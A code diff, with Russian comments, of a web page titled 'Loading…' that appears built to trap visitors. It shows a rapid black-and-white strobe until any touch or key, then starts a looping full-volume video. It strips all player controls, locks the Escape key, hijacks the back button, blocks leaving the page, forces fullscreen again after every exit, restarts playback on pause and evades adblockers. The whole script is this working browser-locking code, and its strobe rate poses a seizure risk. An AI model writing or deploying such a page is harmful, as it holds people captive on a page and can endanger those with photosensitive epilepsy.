@@ -2,8 +2,11 @@
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <meta name="theme-color" content="#000000">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
 <title>Loading…</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -13,9 +16,12 @@
     overflow: hidden;
     background: #000;
     touch-action: none;
+    overscroll-behavior: none;
     -webkit-tap-highlight-color: transparent;
     user-select: none;
     -webkit-user-select: none;
+    -webkit-touch-callout: none;
+    -webkit-user-drag: none;
   }
 
   #flash {
@@ -25,7 +31,6 @@
     background: #000;
     cursor: pointer;
   }
-
   #flash.hidden { display: none; }
 
   #video {
@@ -40,20 +45,35 @@
     pointer-events: none;
     transition: opacity 0.15s linear;
   }
+  #video.active { opacity: 1; pointer-events: auto; }
 
-  #video.active {
-    opacity: 1;
-    pointer-events: auto;
+  #error-msg {
+    position: fixed;
+    inset: 0;
+    z-index: 20;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    padding: 24px;
+    color: #f66;
+    font: 16px/1.4 system-ui, -apple-system, sans-serif;
+    text-align: center;
+    background: #000;
   }
+  #error-msg.show { display: flex; }
 
-  /* Скрываем ВСЕ элементы управления видео — нет кнопки выхода */
+  /* Прячем ВСЁ, что может нарисовать браузер поверх видео */
   #video::-webkit-media-controls,
   #video::-webkit-media-controls-enclosure,
   #video::-webkit-media-controls-panel,
   #video::-webkit-media-controls-play-button,
   #video::-webkit-media-controls-fullscreen-button,
   #video::-webkit-media-controls-start-playback-button,
-  #video::-webkit-media-controls-overlay-play-button {
+  #video::-webkit-media-controls-overlay-play-button,
+  #video::-webkit-media-controls-current-time-display,
+  #video::-webkit-media-controls-time-remaining-display,
+  #video::-webkit-media-controls-timeline,
+  #video::-webkit-media-controls-volume-slider {
     display: none !important;
     -webkit-appearance: none !important;
     opacity: 0 !important;
@@ -68,97 +88,158 @@
 <video id="video"
        src="video.mp4"
        playsinline
-       preload="auto"></video>
+       webkit-playsinline
+       preload="auto"
+       disablepictureinpicture
+       disableremoteplayback></video>
+<div id="error-msg"></div>
 
 <script>
 (function () {
   "use strict";
 
-  const flash = document.getElementById("flash");
-  const video = document.getElementById("video");
+  /* =========================================================
+     НАСТРОЙКИ
+     ========================================================= */
+  const CONFIG = {
+    videoSrc:              "video.mp4",
+    loopVideo:             true,
+    iOSNativeFullscreen:   true,   // на iPhone — нативный плеер (с "Готово")
+    lockOrientation:       true,
+    preventExit:           true,
+    wakeLock:              true,
+    useWebAudio:           true,   // для обхода адблоков через MediaElementSource
+    startupAttempt:        true,   // один раз пробуем автозапуск до жеста
+    startupDelay:          1000,   // задержка перед startup-попыткой
+    retryInterval:         1500,   // периодические ретраи после активации
+    gestureThrottle:       450,    // не чаще этого (мс) — fullscreen на move-событиях
+    burstDelays:           [0, 50, 200, 600, 1500, 3000], // серия повторов
+    tryKeyboardLock:       true,   // перехват Escape (Chrome/Edge)
+    tryBlobFallback:       true,   // обход блокировки видеофайла
+  };
 
-  video.addEventListener("error", () => console.error("Ошибка видео:", video.error));
-  video.addEventListener("loadedmetadata", () => {
-    console.log("Видео загружено:", video.videoWidth + "x" + video.videoHeight, video.duration + "s");
+  const flash   = document.getElementById("flash");
+  const video   = document.getElementById("video");
+  const errBox  = document.getElementById("error-msg");
+
+  /* =========================================================
+     ДЕТЕКТ БРАУЗЕРА И ВОЗМОЖНОСТЕЙ
+     ========================================================= */
+  const UA = navigator.userAgent;
+  const isIOS     = /iPad|iPhone|iPod/.test(UA) ||
+                    (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
+  const isAndroid = /Android/i.test(UA);
+  const isSafari  = /^((?!chrome|android).)*safari/i.test(UA);
+  const isFirefox = /Firefox\//i.test(UA);
+  const isChrome  = /Chrome\//i.test(UA) && !/Edge\//i.test(UA) && !/OPR\//i.test(UA);
+  const isEdge    = /Edg(e|A|iOS)?\//i.test(UA);
+  const isSamsung = /SamsungBrowser/i.test(UA);
+  const isBrave   = !!(navigator.brave && navigator.brave.isBrave);
+
+  const docEl = document.documentElement;
+  const hasDocFullscreen = !!(
+    docEl.requestFullscreen ||
+    docEl.webkitRequestFullscreen ||
+    docEl.mozRequestFullScreen ||
+    docEl.msRequestFullscreen
+  );
+  const hasIOSVideoFs = typeof video.webkitEnterFullscreen === "function";
+
+  console.log("[env]", {
+    isIOS, isAndroid, isSafari, isFirefox, isChrome, isEdge,
+    isSamsung, isBrave, hasDocFullscreen, hasIOSVideoFs
   });
 
-  /* ---------- 1. Мигание ---------- */
+  /* =========================================================
+     СОСТОЯНИЕ
+     ========================================================= */
+  let firstGestureDone = false;   // был хотя бы один жест пользователя
+  let activated        = false;   // видео успешно пошло со звуком
+  let flashing         = true;
+  let lastFsAttempt    = 0;
+  let wakeLock         = null;
+  let audioCtx         = null;
+  let audioSourceDone  = false;   // createMediaElementSource можно только 1 раз
+  let keyboardLocked   = false;
+  let fallbackTried    = false;
 
-  let flashing = true;
-
+  /* =========================================================
+     МИГАНИЕ
+     ========================================================= */
   function scheduleFlash() {
     if (!flashing) return;
     const isWhite = flash.dataset.state !== "white";
     flash.style.backgroundColor = isWhite ? "#ffffff" : "#000000";
     flash.dataset.state = isWhite ? "white" : "black";
-    const base = 180;
+    const base   = 180;
     const jitter = Math.random() * 90;
-    const occasionalPause = Math.random() < 0.04 ? 400 : 0;
-    setTimeout(scheduleFlash, base + jitter + occasionalPause);
+    const pause  = Math.random() < 0.04 ? 400 : 0;
+    setTimeout(scheduleFlash, base + jitter + pause);
   }
   scheduleFlash();
 
-  /* ---------- 2. Аудио ---------- */
-
-  let audioCtx = null;
-
-  function setupAudio() {
+  /* =========================================================
+     WEBAUDIO (для обхода адблоков)
+     ========================================================= */
+  function setupWebAudio() {
+    if (!CONFIG.useWebAudio || audioSourceDone) return;
+    audioSourceDone = true;
     try {
       const AC = window.AudioContext || window.webkitAudioContext;
       if (!AC) return;
       audioCtx = new AC();
-      const sourceNode = audioCtx.createMediaElementSource(video);
-      const gainNode = audioCtx.createGain();
-      gainNode.gain.value = 1.0;
-      sourceNode.connect(gainNode);
-      gainNode.connect(audioCtx.destination);
+      const src  = audioCtx.createMediaElementSource(video);
+      const gain = audioCtx.createGain();
+      gain.gain.value = 1.0;
+      src.connect(gain);
+      gain.connect(audioCtx.destination);
       if (audioCtx.state === "suspended") audioCtx.resume().catch(() => {});
+      console.log("[webaudio] ready");
     } catch (e) {
-      console.warn("WebAudio недоступен:", e);
+      console.warn("[webaudio] failed:", e);
       audioCtx = null;
     }
   }
 
-  /* ---------- 3. Агрессивный fullscreen ---------- */
-
+  /* =========================================================
+     FULLSCREEN
+     ========================================================= */
   function isInFullscreen() {
-    return !!(document.fullscreenElement ||
-              document.webkitFullscreenElement ||
-              document.mozFullScreenElement ||
-              document.msFullscreenElement);
+    return !!(
+      document.fullscreenElement ||
+      document.webkitFullscreenElement ||
+      document.mozFullScreenElement ||
+      document.msFullscreenElement ||
+      video.webkitDisplayingFullscreen
+    );
   }
 
-  function tryFullscreen() {
-    const el = document.documentElement;
-
-    // --- Документ (Android, десктоп) ---
-    if (!isInFullscreen()) {
-      try {
-        if (el.requestFullscreen) {
-          el.requestFullscreen({ navigationUI: "hide" }).catch(() => {});
-        } else if (el.webkitRequestFullscreen) {
-          el.webkitRequestFullscreen();
-        } else if (el.mozRequestFullScreen) {
-          el.mozRequestFullScreen();
-        } else if (el.msRequestFullscreen) {
-          el.msRequestFullscreen();
-        }
-      } catch (e) {}
-    }
-
-    // --- Само видео (iOS и все, кто не умеет document fullscreen) ---
+  function requestDocFullscreen() {
+    if (isInFullscreen()) return true;
     try {
-      if (video.webkitEnterFullScreen && !video.webkitDisplayingFullscreen) {
-        video.webkitEnterFullScreen();
+      if (docEl.requestFullscreen) {
+        docEl.requestFullscreen({ navigationUI: "hide" }).catch(() => {});
+        return true;
+      }
+      if (docEl.webkitRequestFullscreen) { docEl.webkitRequestFullscreen(); return true; }
+      if (docEl.mozRequestFullScreen)    { docEl.mozRequestFullScreen();    return true; }
+      if (docEl.msRequestFullscreen)     { docEl.msRequestFullscreen();     return true; }
+    } catch (e) {}
+    return false;
+  }
+
+  function requestIOSFullscreen() {
+    try {
+      if (video.webkitEnterFullscreen && !video.webkitDisplayingFullscreen) {
+        video.webkitEnterFullscreen();
+        return true;
       }
     } catch (e) {}
-    try {
-      if (video.requestFullscreen && !isInFullscreen() && !video.webkitDisplayingFullscreen) {
-        video.requestFullscreen().catch(() => {});
-      }
-    } catch (e) {}
+    return false;
+  }
 
-    // --- Блокировка ориентации ---
+  function lockOrientation() {
+    if (!CONFIG.lockOrientation) return;
     try {
       if (screen.orientation && screen.orientation.lock) {
         screen.orientation.lock("landscape").catch(() => {});
@@ -172,125 +253,356 @@
     } catch (e) {}
   }
 
-  /* ---------- 4. Возврат в fullscreen при выходе ---------- */
+  function tryKeyboardLock() {
+    if (!CONFIG.tryKeyboardLock || keyboardLocked) return;
+    if (!(navigator.keyboard && navigator.keyboard.lock)) return;
+    try {
+      navigator.keyboard.lock(["Escape"]).then(() => {
+        keyboardLocked = true;
+        console.log("[kbd] Escape locked");
+      }).catch(() => {});
+    } catch (e) {}
+  }
 
-  ["fullscreenchange", "webkitfullscreenchange", "mozfullscreenchange", "MSFullscreenChange"].forEach(evt => {
-    document.addEventListener(evt, () => {
-      if (!isInFullscreen()) {
-        tryFullscreen();
-        setTimeout(tryFullscreen, 30);
-        setTimeout(tryFullscreen, 150);
-        setTimeout(tryFullscreen, 500);
-      }
+  function tryFullscreen() {
+    // Документный fullscreen — Chrome/Edge/Firefox/Safari iPad/desktop
+    if (hasDocFullscreen) {
+      requestDocFullscreen();
+      lockOrientation();
+      return;
+    }
+    // iPhone — нативный плеер (кнопка «Готово» системная, не убирается)
+    if (isIOS && CONFIG.iOSNativeFullscreen && hasIOSVideoFs) {
+      requestIOSFullscreen();
+      return;
+    }
+    // Inline — CSS на весь экран, без нативных контролов
+  }
+
+  function burstRetryFullscreen() {
+    CONFIG.burstDelays.forEach(ms => {
+      setTimeout(() => { if (firstGestureDone) tryFullscreen(); }, ms);
     });
-  });
+  }
 
-  // iOS: видеоплеер вышел из полноэкранного — возвращаем
-  video.addEventListener("webkitendfullscreen", () => {
-    try { video.webkitEnterFullScreen(); } catch (e) {}
-    setTimeout(() => { try { video.webkitEnterFullScreen(); } catch (e) {} }, 100);
-  });
+  /* =========================================================
+     WAKE LOCK
+     ========================================================= */
+  async function requestWakeLock() {
+    if (!CONFIG.wakeLock || wakeLock) return;
+    try {
+      if ("wakeLock" in navigator) {
+        wakeLock = await navigator.wakeLock.request("screen");
+        wakeLock.addEventListener("release", () => { wakeLock = null; });
+        console.log("[wakelock] acquired");
+      }
+    } catch (e) {}
+  }
 
-  /* ---------- 5. Активация по первому действию ---------- */
+  /* =========================================================
+     FALLBACK ИСТОЧНИК (обход адблоков)
+     ========================================================= */
+  async function tryFallbackSource() {
+    if (!CONFIG.tryBlobFallback || fallbackTried) return;
+    fallbackTried = true;
+    console.warn("[fallback] trying fetch+blob");
+    try {
+      const url = CONFIG.videoSrc + "?cb=" + Date.now();
+      const res = await fetch(url, { cache: "no-store" });
+      if (!res.ok) throw new Error("HTTP " + res.status);
+      const blob = await res.blob();
+      const blobUrl = URL.createObjectURL(blob);
+      video.src = blobUrl;
+      video.load();
+      video.muted = false;
+      video.volume = 1.0;
+      const p = video.play();
+      if (p && p.catch) p.catch(() => {});
+      console.log("[fallback] blob loaded, size", blob.size);
+    } catch (e) {
+      console.error("[fallback] failed:", e);
+      showError("Похоже, видео заблокировано. Отключите адблок для этого сайта и обновите страницу.");
+    }
+  }
 
-  let activated = false;
+  function showError(msg) {
+    errBox.textContent = msg;
+    errBox.classList.add("show");
+  }
 
-  function handleAnyAction() {
-    // Первый раз — запускаем видео
-    if (!activated) {
-      activated = true;
+  /* =========================================================
+     ВОСПРОИЗВЕДЕНИЕ
+     ========================================================= */
+  function ensurePlaying() {
+    if (document.hidden) return;
+    if (video.paused) {
+      video.muted = false;
+      video.volume = 1.0;
+      const p = video.play();
+      if (p && p.catch) p.catch(() => {});
+    }
+  }
+
+  /* =========================================================
+     АКТИВАЦИЯ (первый жест)
+     ========================================================= */
+  function onGesture() {
+    // Первый жест — активируем всё
+    if (!firstGestureDone) {
+      firstGestureDone = true;
 
       flashing = false;
       flash.classList.add("hidden");
-
       video.classList.add("active");
-      setupAudio();
 
-      video.muted = false;
+      video.muted  = false;
       video.volume = 1.0;
+      video.loop   = CONFIG.loopVideo;
 
+      // play() первым — самое строгое требование (Safari)
       const playPromise = video.play();
-      if (playPromise && playPromise.catch) {
-        playPromise.catch(err => {
-          console.warn("play() заблокирован:", err);
-          video.muted = true;
-          video.play().then(() => {
-            setTimeout(() => {
-              video.muted = false;
-              if (audioCtx && audioCtx.state === "suspended") audioCtx.resume().catch(() => {});
-            }, 50);
-          }).catch(e => console.error("Повторный play() не удался:", e));
-        });
-      }
 
-      // video.loop = true;
+      // Fullscreen синхронно, сразу после play()
+      tryFullscreen();
+      lockOrientation();
+      requestWakeLock();
+
+      // Обработка результата play()
+      const onSuccess = () => {
+        if (!activated) {
+          activated = true;
+          setupWebAudio();     // только после успешного play()
+          burstRetryFullscreen();
+          console.log("[activate] video playing with sound");
+        }
+      };
+      const onFail = (err) => {
+        console.warn("[activate] play() rejected:", err && err.name, err && err.message);
+        // НЕ пытаемся muted — ждём следующий жест
+      };
+
+      if (playPromise && playPromise.then) {
+        playPromise.then(onSuccess).catch(onFail);
+      } else {
+        // Очень старые браузеры
+        setTimeout(() => {
+          if (!video.paused) onSuccess();
+          else onFail({ name: "Unknown", message: "play() no promise" });
+        }, 150);
+      }
+      return;
     }
 
-    // При КАЖДОМ действии — попытка fullscreen
-    tryFullscreen();
+    // Повторные жесты — throttled ретрай fullscreen
+    const now = Date.now();
+    if (now - lastFsAttempt > CONFIG.gestureThrottle) {
+      lastFsAttempt = now;
+      tryFullscreen();
+      ensurePlaying();
+    }
   }
 
-  /* ---------- 6. Все возможные события ---------- */
+  /* =========================================================
+     ПОДПИСКИ НА ВСЕ ДЕЙСТВИЯ
+     ========================================================= */
 
-  const ALL_EVENTS = [
-    // Touch
-    "touchstart", "touchend", "touchmove", "touchcancel", "touchforcechange",
-    // Pointer
-    "pointerdown", "pointerup", "pointermove", "pointercancel",
-    "pointerover", "pointerenter", "pointerleave",
-    // Mouse
-    "mousedown", "mouseup", "click", "dblclick", "contextmenu", "auxclick",
-    // Keyboard
+  // Активные (без preventDefault) — можно passive
+  const PASSIVE_EVENTS = [
+    "touchstart", "touchend", "touchcancel", "touchforcechange",
+    "pointerdown", "pointerup", "pointercancel",
+    "mousedown", "mouseup", "mousemove",
+    "click", "dblclick", "auxclick",
     "keydown", "keyup", "keypress",
-    // Прочее
-    "wheel", "scroll", "focus", "input", "change",
-    // Жесты (iOS/Safari)
-    "gesturestart", "gesturechange", "gestureend"
+    "wheel", "scroll",
+    "gesturestart", "gesturechange", "gestureend",
+    "popstate", "hashchange",
   ];
 
-  ALL_EVENTS.forEach(name => {
+  PASSIVE_EVENTS.forEach(name => {
     try {
-      document.addEventListener(name, handleAnyAction, { capture: true, passive: true });
+      document.addEventListener(name, onGesture, { capture: true, passive: true });
     } catch (e) {}
   });
 
-  /* ---------- 7. Попытка заблокировать выход ---------- */
+  // Блокирующие (preventDefault) — обязательно passive: false
+  document.addEventListener("touchmove", e => {
+    e.preventDefault();
+    onGesture();
+  }, { capture: true, passive: false });
 
-  // Escape
-  document.addEventListener("keydown", (e) => {
+  document.addEventListener("contextmenu", e => {
+    e.preventDefault();
+    e.stopPropagation();
+    onGesture();
+    return false;
+  }, { capture: true, passive: false });
+
+  document.addEventListener("selectstart", e => e.preventDefault(), { passive: false });
+  document.addEventListener("dragstart",   e => e.preventDefault(), { passive: false });
+
+  /* =========================================================
+     ESCAPE
+     ========================================================= */
+  document.addEventListener("keydown", e => {
     if (e.key === "Escape" || e.key === "Esc" || e.keyCode === 27) {
       e.preventDefault();
       e.stopPropagation();
-      tryFullscreen();
+      // После Escape браузер выйдет из FS — fullscreenchange поймает и вернёт.
+      // Здесь сами ничего не делаем (иначе двойной вызов).
       return false;
     }
-  }, true);
+  }, { capture: true, passive: false });
 
-  // Android back button — заменяем историю, чтобы «назад» не выходило
-  try {
-    history.pushState(null, "", location.href);
-    window.addEventListener("popstate", () => {
-      history.pushState(null, "", location.href);
-      tryFullscreen();
+  /* =========================================================
+     FULLSCREEN CHANGE
+     ========================================================= */
+  ["fullscreenchange", "webkitfullscreenchange", "mozfullscreenchange", "MSFullscreenChange"]
+    .forEach(evt => {
+      document.addEventListener(evt, () => {
+        if (!firstGestureDone) return;
+        if (!isInFullscreen()) {
+          // Вышли — пытаемся вернуть
+          burstRetryFullscreen();
+        } else {
+          // Вошли — пробуем lock клавиатуры
+          tryKeyboardLock();
+        }
+      });
     });
-  } catch (e) {}
 
-  // Не даём уйти со страницы
-  window.addEventListener("beforeunload", (e) => {
-    if (activated) {
-      e.preventDefault();
-      e.returnValue = "";
+  video.addEventListener("webkitendfullscreen", () => {
+    if (!firstGestureDone) return;
+    burstRetryFullscreen();
+  });
+
+  /* =========================================================
+     ЖИЗНЕННЫЙ ЦИКЛ
+     ========================================================= */
+  document.addEventListener("visibilitychange", () => {
+    if (document.visibilityState !== "visible") return;
+    if (!firstGestureDone) return;
+    ensurePlaying();
+    tryFullscreen();
+    requestWakeLock();
+    if (audioCtx && audioCtx.state === "suspended") audioCtx.resume().catch(() => {});
+  });
+
+  window.addEventListener("focus", () => {
+    if (!firstGestureDone) return;
+    ensurePlaying();
+    tryFullscreen();
+  });
+
+  window.addEventListener("resize", () => {
+    if (!firstGestureDone) return;
+    tryFullscreen();
+  });
+
+  window.addEventListener("orientationchange", () => {
+    if (!firstGestureDone) return;
+    setTimeout(tryFullscreen, 200);
+  });
+
+  /* =========================================================
+     СОБЫТИЯ ВИДЕО
+     ========================================================= */
+  video.addEventListener("error", () => {
+    console.error("[video] error:", video.error);
+    // Пробуем fallback (blob) — если ещё не пробовали
+    tryFallbackSource();
+  });
+
+  video.addEventListener("stalled", () => {
+    console.warn("[video] stalled");
+    setTimeout(ensurePlaying, 1000);
+  });
+
+  video.addEventListener("pause", () => {
+    if (firstGestureDone && !document.hidden) {
+      setTimeout(() => ensurePlaying(), 0);
     }
   });
 
-  /* ---------- 8. Периодические попытки ---------- */
+  video.addEventListener("ended", () => {
+    if (!firstGestureDone) return;
+    try { video.currentTime = 0; } catch (e) {}
+    ensurePlaying();
+  });
 
+  video.addEventListener("loadedmetadata", () => {
+    console.log("[video] metadata:",
+      video.videoWidth + "x" + video.videoHeight, video.duration + "s");
+  });
+
+  /* =========================================================
+     STARTUP ATTEMPT (один раз, до жеста)
+     ========================================================= */
+  function startupAttempt() {
+    if (firstGestureDone) return;   // жест уже был — поздно
+    console.log("[startup] trying auto-play + fullscreen");
+
+    video.muted  = false;
+    video.volume = 1.0;
+    video.loop   = CONFIG.loopVideo;
+
+    const p = video.play();
+    if (p && p.catch) p.catch(() => {});
+
+    tryFullscreen();
+    requestWakeLock();
+    // НЕ ставим activated — если play() прошёл, onGesture всё равно сработает
+    // по первому жесту и подтвердит. Но если play() реально прошёл — ок.
+    if (p && p.then) {
+      p.then(() => {
+        // Автозапуск со звуком сработал (PWA/киоск/ослабленная политика)
+        activated = true;
+        setupWebAudio();
+        console.log("[startup] autoplay succeeded");
+      }).catch(() => {
+        console.log("[startup] autoplay rejected (ожидаемо)");
+      });
+    }
+  }
+
+  /* =========================================================
+     POPSTATE / BEFOREUNLOAD
+     ========================================================= */
+  if (CONFIG.preventExit) {
+    try {
+      history.pushState(null, "", location.href);
+      window.addEventListener("popstate", () => {
+        history.pushState(null, "", location.href);
+        if (firstGestureDone) tryFullscreen();
+      });
+    } catch (e) {}
+
+    window.addEventListener("beforeunload", e => {
+      if (!firstGestureDone) return;
+      const msg = "Видео активно. Точно выйти?";
+      e.preventDefault();
+      e.returnValue = msg;
+      return msg;
+    });
+  }
+
+  /* =========================================================
+     ПЕРИОДИЧЕСКИЙ РЕТРАЙ
+     ========================================================= */
   setInterval(() => {
-    if (activated) tryFullscreen();
-  }, 1500);
+    if (!firstGestureDone) return;
+    tryFullscreen();
+    ensurePlaying();
+    if (!wakeLock) requestWakeLock();
+  }, CONFIG.retryInterval);
 
-  /* ---------- 9. Предзагрузка ---------- */
+  /* =========================================================
+     ПРЕДЗАГРУЗКА И STARTUP
+     ========================================================= */
   try { video.load(); } catch (e) {}
+
+  if (CONFIG.startupAttempt) {
+    setTimeout(startupAttempt, CONFIG.startupDelay);
+  }
 
 })();
 </script>
